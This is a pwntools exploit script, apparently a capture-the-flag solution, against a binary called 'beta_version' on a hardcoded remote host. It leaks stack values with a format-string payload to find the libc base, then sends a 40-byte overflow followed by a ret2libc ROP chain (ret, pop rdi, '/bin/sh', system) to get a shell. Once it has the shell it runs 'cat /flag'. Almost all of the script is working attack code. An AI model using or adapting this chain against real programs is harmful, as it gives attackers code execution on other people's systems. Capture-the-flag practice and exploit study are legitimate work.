#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./beta_version')

if exe.bits == 32:
    lindbg = "/root/linux_server"
else:
    lindbg = "/root/linux_server64"


# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '109.233.56.90'
port = int(args.PORT or 11663)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.EDB:
        return process(['edb', '--run', exe.path] + argv, *a, **kw)
    elif args.QIRA:
        return process(['qira', exe.path] + argv, *a, **kw)
    elif args.IDA:
        return process([lindbg], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)
# RWX:      Has RWX segments

beta_store_offset = 0x7FA
beta_read_offset = 0x836
junk_offset = 0x85C
main_offset = 0x872
csu_init_offset = 0x910

io = start()
# io.recvuntil("it/n")
pl = "1 "
pl += "%14$p.%15$p." # csu_init
io.sendline(pl)

io.recvuntil("Hello, ")
leaked_addreses = io.recvline().strip().split(b".")
csu_init = int(leaked_addreses[0], 16)
libc_main_ret = int(leaked_addreses[1], 16)
# log.info(f"Csu_init: {hex(csu_init)}")
# log.info(f"Libc_: {hex(libc_main_ret)}")

start_addr = csu_init - csu_init_offset

RET = start_addr + 0x60e

pl = b"2"
pl += cyclic(40)

if args.LOCAL:
    libc = ELF("libc6_2.31-3_amd64.so")
    LIBC_base = libc_main_ret - 0x026cca
    libc.adress = LIBC_base
    system = LIBC_base + 0x048f20
    POP_RDI = LIBC_base + 0x2679e
    binsh = LIBC_base + 0x18a156
    # pl += p64(POP_RDI)
    # pl += p64(binsh)
    # pl += p64(system)

else:
    libc = ELF("libc6_2.27-3ubuntu1.2_amd64.so")
    LIBC_base = libc_main_ret - 0x021b97
    libc.adress = LIBC_base
    one_gadget = LIBC_base + 0x4F3C2
    system = LIBC_base + 0x04f4e0
    POP_RDI = LIBC_base + 0x2155f
    binsh = LIBC_base + 0x1b40fa
    # pl += p64(one_gadget)
    pl += p64(RET)


pl += p64(POP_RDI)
pl += p64(binsh)
pl += p64(system)
io.sendline(pl)

io.sendline("cat /flag")


io.recvuntil("spbctf")
flag = io.recv().decode()
log.success(f"Flag: spbctf{flag}")

# io.interactive()

io.close()

